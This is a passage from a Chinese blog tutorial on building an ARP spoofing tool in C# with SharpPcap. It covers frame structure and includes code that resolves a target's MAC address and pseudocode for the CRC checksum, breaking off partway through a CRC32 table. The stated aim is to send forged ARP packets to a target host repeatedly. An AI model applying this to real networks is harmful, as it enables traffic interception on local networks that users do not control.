LibPcap是一个UNIX下的C函数库，它提供的API，能获取和过滤从任意一块网卡在数据链路层上的帧。不同的UNIX系统有不同的架构去处理数据链路层上的数据帧，所以程序员如果想要写一个能运行在UNIX上的、直接读取或者操作数据链路层上的帧的应用程序，他就不得不专门为这个特点版本的UNIX写一个访问帧的函数。libpcap的目的就是提供一个抽象层，这样程序员就能编写可运行在所有版本的UNIX上的包获取和分析工具了。</p><p>然后是WinPcap: WinPcap是一个专为Windows系统设计的、基于libpcap的库。大多数Windows下的网络流量分析工具都是基于WinPcap开发的，比如Wireshark。</p><p>接着是SharpPcap： SharpPcap是封装好WinPcap和LibPcap的C#库。</p><p>除了知道开发用的库还要知道以太网帧和ARP报文的结构（SharpPcap提供的封装好的方法，为了学习还是自己造轮子）：</p><figure><img src="/assets/2-1abf36b5.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>第一部分：以太网首部 也可以说是以太网帧的头部，这部分包括了目标主机的MAC地址、源主机的MAC地址、上层协议类型 第二部分：ARP报文 这部分中的第20位，0x00,0x01表示ARP请求包,0x00,0x02表示应答包。 由于以太网帧最短长度为64个字节，由于ARP报文加上以太网头不足64个字节，所以要填充18个字节的0x00 第三部分：FCS帧校验序列 即计算机网络数据链路层的协议数据单元（帧）的尾部字段，是一段4个字节的循环冗余校验码。源节点发送数据帧时，由帧的帧头和数据部分计算得出FCS，目的节点接收到后，用同样的方式再计算一遍FCS，如果与接收到的FCS不同，则认为帧在传输过程中发生了错误，从而选择丢弃这个帧。</p><p>知道了ARP欺骗的原理和ARP数据包的格式后，只要构造出一个ARP欺骗包，重复向目标主机发出就可以了。 原理很简单，实现起来稍有一点难度： 首先要先要获取本机的IP地址和MAC地址，下面的Deemo中给出了SharpPacp获取本机IPv4地址和MAC地址的方法:</p><figure><img src="/assets/3-3efeb0d0.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>代码分析： LibPcapLiveDeviceList.Instance获取本机中所有网卡的List device.Address获取房卡中所有的地址信息（包括IPv4，IPv6，MAC） Sockaddr.AddressType.AF_INET_AFINET6用于判断是不是IP地址(<a href="http://sharppcap.sourceforge.net/htmldocs/SharpPcap.LibPcap/Sockaddr+AddressTypes.html" target="_blank" rel="noopener noreferrer">官方解释<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>) Sockaddr.AddressType.AF_INET_AFINET6用于判断是不是MAC地址</p><p>接下来还要获取到目标主机的地址信息，IP地址和MAC可以手动指定，为了更加人性化的入狱操作，当然要根据输入的IP自动获得MAC地址了，原理如下： 知道ARP原理了，获取对方的MAC地址只要向对方发送一个ARP请求包然后监听网卡就可以了。 代码如下：</p><div class="language-csharp line-numbers-mode" data-ext="cs"><pre class="language-csharp"><code><span class="token doc-comment comment">/// <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>summary</span><span class="token punctuation">&gt;</span></span></span>
<span class="token doc-comment comment">/// 发送ARP请求包，根据返回的应答包获取MAC地址</span>
<span class="token doc-comment comment">/// <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>summary</span><span class="token punctuation">&gt;</span></span></span>
<span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">ScanLAN</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> recipientIP<span class="token punctuation">,</span><span class="token class-name"><span class="token keyword">string</span></span> senderMAC<span class="token punctuation">,</span><span class="token class-name"><span class="token keyword">string</span></span> senderIP<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token comment">// 构造Arp请求包</span>
	<span class="token class-name"><span class="token keyword">var</span></span> arpPackets <span class="token operator">=</span> <span class="token function">BuildRequest</span><span class="token punctuation">(</span>IPAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>recipientIP<span class="token punctuation">)</span><span class="token punctuation">,</span> PhysicalAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>senderMAC<span class="token punctuation">)</span><span class="token punctuation">,</span> IPAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>senderIP<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//创建一个“tcpdump”过滤器，只允许读取arp回复</span>
	<span class="token class-name">String</span> arpFilter <span class="token operator">=</span> <span class="token string">&quot;arp and ether dst &quot;</span> <span class="token operator">+</span> senderMAC<span class="token punctuation">;</span>

	<span class="token comment">//open the device with 20ms timeout 打开设备，设置超时时间20ms</span>
	_device<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>DeviceMode<span class="token punctuation">.</span>Promiscuous<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//set the filter    设置过滤器</span>
	_device<span class="token punctuation">.</span>Filter <span class="token operator">=</span> arpFilter<span class="token punctuation">;</span>

	<span class="token comment">//初始化扫描线程</span>
	scanThread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span>
	<span class="token punctuation">{</span>
		<span class="token class-name"><span class="token keyword">var</span></span> lastRequestTime <span class="token operator">=</span> DateTime<span class="token punctuation">.</span><span class="token function">FromBinary</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name"><span class="token keyword">var</span></span> requestInterval <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">TimeSpan</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name"><span class="token keyword">var</span></span> timeoutDateTime <span class="token operator">=</span> DateTime<span class="token punctuation">.</span>Now <span class="token operator">+</span> timeout<span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>DateTime<span class="token punctuation">.</span>Now <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span> timeoutDateTime<span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>requestInterval <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span> <span class="token punctuation">(</span>DateTime<span class="token punctuation">.</span>Now <span class="token operator">-</span> lastRequestTime<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token comment">// inject the packet to the wire 发送请求包</span>
				_device<span class="token punctuation">.</span><span class="token function">SendPacket</span><span class="token punctuation">(</span>arpPackets<span class="token punctuation">)</span><span class="token punctuation">;</span>
				lastRequestTime <span class="token operator">=</span> DateTime<span class="token punctuation">.</span>Now<span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token comment">//read the next packet from the network</span>
			<span class="token class-name"><span class="token keyword">var</span></span> reply <span class="token operator">=</span> _device<span class="token punctuation">.</span><span class="token function">GetNextPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//获取网卡中的下一个包，过滤出ARP</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span>reply <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>  <span class="token comment">//下一个包为空时，跳过本次循环</span>
			<span class="token punctuation">{</span>
				<span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token comment">// parse the packet 解析数据包</span>
			<span class="token class-name"><span class="token keyword">var</span></span> packet <span class="token operator">=</span> PacketDotNet<span class="token punctuation">.</span>Packet<span class="token punctuation">.</span><span class="token function">ParsePacket</span><span class="token punctuation">(</span>reply<span class="token punctuation">.</span>LinkLayerType<span class="token punctuation">,</span> reply<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">// is this an arp packet? 这是一个arp数据包吗？</span>
			<span class="token class-name"><span class="token keyword">var</span></span> arpPacket <span class="token operator">=</span> PacketDotNet<span class="token punctuation">.</span>ARPPacket<span class="token punctuation">.</span><span class="token function">GetEncapsulated</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>arpPacket <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token comment">//if this is the reply we&#39;re looking for, stop  //ARP包中的源主机IP 等于 UI中的目标主机IP</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>arpPacket<span class="token punctuation">.</span>SenderProtocolAddress<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Equals</span><span class="token punctuation">(</span>recipientIP<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token comment">// 通知事件 -更新靶机MAC</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>ResolvedEvent <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
				<span class="token punctuation">{</span>
					<span class="token function">ResolvedEvent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arpPacket<span class="token punctuation">.</span>SenderHardwareAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>

		_device<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//关闭设备</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	scanThread<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//启动线程</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>代码解析： 创建一个线程专门用来发送ARP请求包和解析网卡中收到的ARP应答包，启动线程发送一个包后，检测网卡数据，并过滤出所有网卡中的ARP数据包，然后对包进行解析，如果包中的源主机IP是构造的包中的目标主机证明这个包是刚才发送的请求包的应答包，然后1.通知事件更新UI、2.结束线程、3.关闭设备</p><p>得到本机地址信息和目标主机的地址信息后，只要将之前构造的包中的相应的地址信息体替换掉就好了</p><figure><img src="/assets/4-2224fec7.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>除了要换掉包中的地址信息，还要在尾部加上FCS校验码： 什么是FCS校验码？ FCS：Frame Check Sequence（帧校验序列），俗称帧尾，即计算机网络数据链路层的协议数据单元（帧）的尾部字段，是一段4个字节的循环冗余校验码。源节点发送数据帧时，由帧的帧头和数据部分计算得出FCS，目的节点接收到后，用同样的方式再计算一遍FCS，如果与接收到的FCS不同，则认为帧在传输过程中发生了错误，从而选择丢弃这个帧。 FCS提供了一种错误检测机制，用来验证帧在传输过程中的完整性。 FCS采用了循环冗余校验CRC32校验算法，那么什么是CRC校验呢？ CRC校验通俗点讲，就是将给出的二进制数据与一个固定的多项式进行莫2除计算，得出的余数就是CRC校验码。 举个栗：计算4位的CRC校验码</p><figure><img src="/assets/5-62f16b3e.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>知道CRC计算原理后，再来看一下CRC-4的实现: 原始的 CRC 校验算法: 根据多项式除法，我们就可以得到原始的 CRC 校验算法。假设生成多项式 g(x) 是 r 阶的，原始数据存放在 data 中，长度为 len 个 bit ， reg 是 r+1 位的变量。 以 CRC-4 为例，生成多项式 g(x)=x^4 + x + 1 ，对应了一个 5bits 的二进制数字 10011 ，那么 reg 就是 5 bits 。</p><p>reg[1] 表明 reg 的最低位， reg[r+1] 是 reg 的最高位。</p><p>通过反复的移位和进行除法，那么最终该寄存器中的值去掉最高一位就是我们所要求的余数。所以可以将上述步骤用下面的流程描述：</p><div class="language-csharp line-numbers-mode" data-ext="cs"><pre class="language-csharp"><code>reg <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
data <span class="token operator">=</span> data追加r个<span class="token punctuation">;</span>
pos <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">while</span><span class="token punctuation">(</span>pos <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">=</span> len<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>reg<span class="token punctuation">[</span>r<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// 表明reg可以除以g(x)</span>
    <span class="token punctuation">{</span>
        <span class="token comment">// 只关心余数，根据上面的算法规则可知就是XOR运算</span>
        reg <span class="token operator">=</span> reg <span class="token return-type class-name">XOR</span> <span class="token function">g</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 移出最高位，移入新数据</span>
    reg <span class="token operator">=</span> <span class="token punctuation">(</span>reg<span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>pos<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    pos<span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">return</span> reg<span class="token punctuation">;</span> <span class="token comment">// reg中的后r位存储的就是余数</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上面只是简述一下CRC算法的原理，如果采用CRC-4的原始算法实现速度很慢计算一个ARP数据包的CRC32码大约亲测需要十几秒左右的时间，由于CRC32算法实现比较复杂，这里不再做论述，直接上大神写的CRC-32算法实现代码：</p><div class="language-csharp line-numbers-mode" data-ext="cs"><pre class="language-csharp"><code><span class="token comment">//CRC32计算表</span>
<span class="token class-name">UInt32<span class="token punctuation">[</span><span class="token punctuation">]</span></span> crcTable <span class="token operator">=</span>
<span class="token punctuation">{</span>

  <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x04c11db7</span><span class="token punctuation">,</span> <span class="token number">0x09823b6e</span><span class="token punctuation">,</span> <span class="token number">0x0d4326d9</span><span class="token punctuation">,</span> <span class="token number">0x130476dc</span><span class="token punctuation">,</span> <span class="token number">0x17c56b6b</span><span class="token punctuation">,</span> <span class="token number">0x1a864db2</span><span class="token punctuation">,</span> <span class="token number">0x1e475005</span><span class="token punctuation">,</span>

  <span class="token number">0x2608edb8</span><span class="token punctuation">,</span> <span class="token number">0x22c9f00f</span><span class="token punctuation">,</span> <span class="token number">0x2f8ad6d6</span><span class="token punctuation">,</span> <span class="token number">0x2b4bcb61</span><span class="token punctuation">,</span> <span class="token number">0x350c9b64</span><span class="token punctuation">,</span> <span class="token number">0x31cd86d3</span><span class="token punctuation">,</span> <span class="token number">0x3c8ea00a</span><span class="token punctuation">,</span> <span class="token number">0x384fbdbd</span><span class="token punctuation">,</span>

  <span class="token number">0x4c11db70</span><span class="token punctuation">,</span> <span class="token number">0x48d0c6c7</span><span class="token punctuation">,</span> <span class="token number">0x4593e01e</span><span class="token punctuation">,</span> <span class="token number">0x4152fda9</span><span class="token punctuation">,</span> <span class="token number">0x5f15adac</span><span class="token punctuation">,</span> <span class="token number">0x5bd4b01b</span><span class="token punctuation">,</span> <span class="token number">0x569796c2</span><span class="token punctuation">,</span> <span class="token number">0x52568b75</span><span class="token punctuation">,</span>

  <span class="token number">0x6a1936c8</span><span class="token punctuation">,</span> <span class="token number">0x6ed82b7f</span><span class="token punctuation">,</span> <span class="token number">0x639b0da6</span><span class="token punctuation">,</span> <span class="token number">0x675a1011</span><span class="token punctuation">,</span> <span class="token number">0x791d4014</span><span class="token punctuation">,</span> <span class="token number">0x7ddc5da3</span><span class="token punctuation">,</span> <span class="token number">0x709f7b7a</span><span class="token punctuation">,</span> <span class="token number">0x745e66cd</span><span class="token punctuation">,</span>

  <span class="token number">0x9823b6e0</span><span class="token punctuation">,</span> <span class="token number">0x9ce2ab57</span><span class="token punctuation">,</span> <span class="token number">0x91a18d8e</span><span class="token punctuation">,</span> <span class="token number">0x95609039</span><span class="token punctuation">,</span> <span class="token number">0x8b27c03c</span><span class="token punctuation">,</span> <span class="token number">0x8fe6dd8b</span><span class="token punctuation">,</span> <span class="token number">0x82a5fb52</span><span class="token punctuation">,</span> <span class="token number">0x8664e6e5</span><span class="token punctuation">,</span>

  <span class="token number">0xbe2b5b58</span><span class="token punctuation">,</span> <span class="token number">0xbaea46ef</span><span class="token punctuation">,</span> <span class="token number">0xb7a96036</span><span class="token punctuation">,</span> <span class="token number">0xb3687d81</span><span class="token punctuation">,</span> <span class="token number">0xad2f2d84</span><span class="token punctuation">,</span> <span class="token number">0xa9ee3033</span><span class="token punctuation">,</span> <span class="token number">0xa4ad16ea</span><span class="token punctuation">,</span> <span class="token number">0xa06c0b5d</span><span class="token punctuation">,</span>

  <span class="token number">0xd4326d90</span><span class="token punctuation">,</span> <span class="token number">0xd0f37027</span><span class="token punctuation">,</span> <span class="token number">0xddb056fe</span><span class="token punctuation">,</span> <span class="token number">0xd9714b49</span><span class="token punctuation">,</span> <span class="token number">0xc7361b4c</span><span class="token punctuation">,</span> <span class="token number">0xc3f706fb</span><span class="token punctuation">,</span> <span class="token number">0xceb42022</span><span class="token punctuation">,</span> <span class="token number">0xca753d95</span><span class="token punctuation">,</span>

  <span class="token number">0xf23a8028</span><span class="token punctuation">,</span> <span class="token number">0xf6fb9d9f</span><span class="token punctuation">,</span> <span class="token number">0xfbb8bb46</span><span class="token punctuation">,</span> <span class="token number">0xff79a6f1</span><span class="token punctuation">,</span> <span class="token number">0xe13ef6f4</span><span class="token punctuation">,</span> <span class="token number">0xe5ffeb43</span><span class="token punctuation">,</span> <span class="token number">0xe8bccd9a</span><span class="token punctuation">,</span> <span class="token number">0xec7dd02d</span><span class="token punctuation">,</span>

  <span class="token number">0x34867077</span><span class="token punctuation">,</span> <span class="token number">0x30476dc0</span><span class="token punctuation">,</span> <span class="token number">0x3d044b19</span><span class="token punctuation">,</span> <span class="token number">0x39c556ae</span><span class="token punctuation">,</span> <span class="token number">0x278206ab</span><span class="token punctuation">,</span> <span class="token number">0x23431b1c</span><span class="token punctuation">,</span> <span class="token number">0x2e003dc5</span><span class="token punctuation">,</span> <span class="token number">0x2ac12072</span><span class="token punctuation">,</span>

  <span class="token number">0x128e9dcf</span><span class="token punctuation">,</span> <span class="token number">0x164f8078</span><span class="token punctuation">,</span> <span class="token number">0x1b0ca6a1</span><span class="token punctuation">,</span> <span class="token number">0x1fcdbb16</span><span class="token punctuation">,</span> <span class="token number">0x018aeb13</span><span class="token punctuation">,</span> <span class="token number">0x054bf6a4</span><span class="token punctuation">,</span> <span class="token number">0x0808d07d</span><span class="token punctuation">,</span> <span class="token number">0x0cc9cdca</span><span class="token punctuation">,</span>

  <span class="token number">0x7897ab07</span><span class="token punctuation">,</span> <span class="token number">0x7c56b6b0</span><span class="token punctuation">,</span> <span class="token number">0x71159069</span><span class="token punctuation">,</span> <span class="token number">0x75d48dde</span><span class="token punctuation">,</span> <span class="token number">0x6b93dddb</span><span class="token punctuation">,</span> <span class="token number">0x6f52c06c</span><span class="token punctuation">,</span> <span class="token number">0x6211e6b5</span><span class="token punctuation">,</span> <span class="token number">0x66d0fb02</span><span class="token punctuation">,</span>

  <span class="token number">0x5e9f46bf</span><span class="token punctuation">,</span> <span class="token number">0x5a5e5b08</span><span class="token punctuation">,</span> <span class="token number">0x571d7dd1</span><span class="token punctuation">,</span> <span class="token number">0x53dc6066</span><span class="token punctuation">,</span> <span class="token number">0x4d9b3063</span><span class="token punctuation">,</span> <span class="token number">0x495a2dd4</span><span class="token punctuation">,</span> <span class="token number">0x44190b0d</span><span class="token punctuation">,</span> <span class="token number">0x40d816ba</span><span class="token punctuation">,</span>

  <span class="token number">0xaca5c697</span><span class="token punctuation">,</span> <span class="token number">0xa864db20</span><span class="token punctuation">,</span> <span class="token number">0xa527fdf9</span><span class="token punctuation">,</span> <span class="token number">0xa1e6e04e</span><span class="token punctuation">,</span> <span class="token number">0xbfa1b04b</span><span class="token punctuation">,</span> <span class="token number">0xbb60adfc</span><span class="token punctuation">,</span> <span class="token number">0xb6238b25</span><span class="token punctuation">,</span> <span class="token number">0xb2e29692</span><span class="token punctuation">,</span>

  <span class="token number">0x8aad2b2f</span><span class="token punctuation">,</span> <span class="token number">0x8e6c3698</span><span class="token punctuation">,</span> <span class="token number">0x832f1041</span><span class="token punctuation">,</span> <span class="token number">0x87ee0df6</span><span class="token punctuation">,</span> <span class="token number">0x99a95df3</span><span class="token punctuation">,</span> <span class="token number">0x9d684044</span><span class="token punctuation">,</span> <span class="token number">0x902b669d</span><span class="token punctuation">,</span> <span class="token number">0x94ea7b2a</span><span class="token punctuation">,</span>

  <span class="token number">0xe0b41de7</span><span class="token punctuation">,</span> <span class="token number">0xe4750050</span><span class="token punctuation">,</span> <span class="token number">0xe9362689</span><span class="token punctuation">,</span> <span class="token number">0xedf73b3e</span><span class="token punctuation">,</span> <span class="token number">0xf3b06b3b</span><span class="token punctuation">,</span> <span class="token number">0xf771768c</span><span class="token punctuation">,</span> <span class="token number">0xfa325055</span><span class="token punctuation">,</span> <span class="token number">0xfef34de2</span><span class="token punctuation">,</span>

  <span class="token number">0xc6bcf05f</span><span class="token punctuation">,</span> <span class="token number">0xc27dede8</span><span class="token punctuation">,</span> <span class="token number">0xcf3ecb31</span><span class="token punctuation">,</span> <span class="token number">0xcbffd686</span><span class="token punctuation">,</span> <span class="token number">0xd5b88683</span><span class="token punctuation">,</span> <span class="token number">0xd1799b34</span><span class="token punctuation">,</span> <span class="token number">0xdc3abded</span><span class="token punctuation">,</span> <span class="token number">0xd8fba05a</span><span class="token punctuation">,</span>

  <span class="token number">0x690ce0ee</span><span class="token punctuation">,</span> <span class="token number">0x6dcdfd59</span><span class="token punctuation">,</span> <span class="token number">0x608edb80</span><span class="token punctuation">,</span> <span class="token number">0x644fc637</span><span class="token punctuation">,</span> <span class="token number">0x7a089632</span><span class="token punctuation">,</span> <span class="token number">0x7ec98b85</span><span class="token punctuation">,</span> <span class="token number">0x738aad5c</span><span class="token punctuation">,</span> <span class="token number">0x774bb0eb</span><span class="token punctuation">,</span>

  <span class="token number">0x4f040d56</span><span class="token punctuation">,</span> <span class="token number">0x4bc510e1</span><span class="token punctuation">,</span> <span class="token number">0x46863638</span><span class="token punctuation">,</span> <span class="token number">0x42472b8f</span><span class="token punctuation">,</span> <span class="token number">0x5c007b8a</span><span class="token punctuation">,</span> <span class="token number">0x58c1663d</span><span class="token punctuation">,</span> <span class="token number">0x558240e4</span><span class="token punctuation">,</span> <span class="token number">0x51435d53</span><span class="token punctuation">,</span>

  <span class="token number">0x251d3b9e</span><span class="token punctuation">,</span> <span class="token number">0x21dc2629</span><span class="token punctuation">,</span> <span class="token number">0x2c9f00f0</span><span class="token punctuation">,</span> <span class="token number">0x285e1d47</span><span class="token punctuation">,</span> <span class="token number">0x36194d42</span><span class="token punctuation">,</span> <span class="token number">0x32d850f5</span><span class="token punctuation">,</span> <span class="token number">0x3f9b762c</span><span class="token punctuation">,</span> <span class="token number">0x3b5a6b9b</span><span class="token punctuation">,</span>

  <span class="token number">0x0315d626</span><span class="token punctuation">,</span> <span class="token number">0x07d4cb91</span><span class="token punctuation">,</span> <span class="token number">0x0a97ed48</span><span class="token punctuation">,</span> <span class="token number">0x0e56f0ff</span><span class="token punctuation">,</span> <span class="token number">0x1011a0fa</span><span class="token punctuation">,</span> <span class="token number">0x14d0bd4d</span><span class="token punctuation">,</span> <span class="token number">0x19939b94</span><span class="token punctuation">,</span> <span class="token number">0x1d528623</span><span class="token punctuation">,</span>

  <span class="token number">0xf12f560e</span><span class="token punctuation">,</span> <span class="token number">0xf5ee4bb9</span><span class="token punctuation">,</span> <span class="token number">0xf8ad6d60</span><span class="token punctuation">,</span> <span class="token number">0xfc6c70d7</span><span class="token punctuation">,</span> <span class="token number">0xe22b20d2</span><span class="token punctuation">,</span> <span class="token number">0xe6ea3d65</span><span class="token punctuation">,</span> <span class="token number">0xeba91bbc</span><span class="token punctuation">,</span> <span class="token number">0xef68060b</span><span class="token punctuation">,</span>

  <span class="token number">0xd727bbb6</span><span class="token punctuation">,</span> <span class="token number">0xd3e6a601</span><span class="token punctuation">,</span> <span class="token number">0xdea580d8</span><span class="token punctuation">,</span> <span class="token number">0xda649d6f</span><span class="token punctuation">,</span> <span class="token number">0xc423cd6a</span><span class="token punctuation">,</span> <span class="token number">0xc0e2d0dd</span><span class="token punctuation">,</span> <span class="token number">0xcda1f604</span><span class="token punctuation">,</span> <span class="token number">0xc960ebb3</span><span class="token punctuation">,</span>

  <span class="token number">0xbd3e8d7e</span><span class="token punctuation">,</span> <span class="token number">0xb9ff90c9</span><span class="token punctuation">,</span> <span class="token number">0xb4bcb610</span><span class="token punctuation">,</span> <span class="token number">0xb07daba7</span><span class="token punctuation">,</span> <span class="token number">0xae3afba2</span><span class="token punctuation">,</span> <span class="token number">0xaafbe615</span><span class="token punctuation">,</span> <span class="token number">0xa7b8c0cc</span><span class="token punctuation">,</span> <span class="token number">0xa379dd7b</span><span class="token punctuation">,</span>

  <span class="token number">0x9b3660c6</span><span class="token punctuation">,</span> <span class="token number">0x9ff77d71</span><span class="token punctuation">,</span> <span class="token number">0x92b45ba8</span><span class="token punctuation">,</span> <span class="token number">0x9675461f</span><span class="token punctuation">,</span> <span class="token number">0x8832161a</span><span class="token punctuation">,</span> <span class="token number">0x8cf30bad</span><span class="token punctuation">,</span> <span class="token number">0x81b02d74</span><span class="token punctuation">,</span> <span class="token number">0x857130c3</span><span class="token punctuation">,</span>

  <span class="token number">0x5d8a9099</span><span class="token punctuation">,</span> <span class="token number">0x594b8d2e</span><span class="token punctuation">,</span> <span class="token number">0x5408abf7</span><span class="token punctuation">,</span> <span class="token number">0x50c9b640</span><span class="token punctuation">,</span> <span class="token number">0x4e8ee645</span><span class="token punctuation">,</span> <span class="token number">0x4a4ffbf2</span><span class="token punctuation">,</span> <span class="token number">0x470cdd2b</span><span class="token punctuation">,</span> <span class="token number">0x43cdc09c</span><span class="token punctuation">,</span>

  <span class="token number">0x7b827d21</span><span class="token punctuation">,</span> <span class="token number">0x7f436096</span><span class="token punctuation">,</span> <span class="token number">0x7200464f</span><span class="token punctuation">,</span> <span class="token number">0x76c15bf8</span><span class="token punctuation">,</span> <span class="token number">0x68860bfd</span><span class="token punctuation">,</span> <span class="token number">0x6c47164a</span><span class="token punctuation">,</span> <span class="token number">0x61043093</span><span class="token punctuation">,</span> <span class="token number">0x65c52d24</span><span class="token punctuation">,</span>

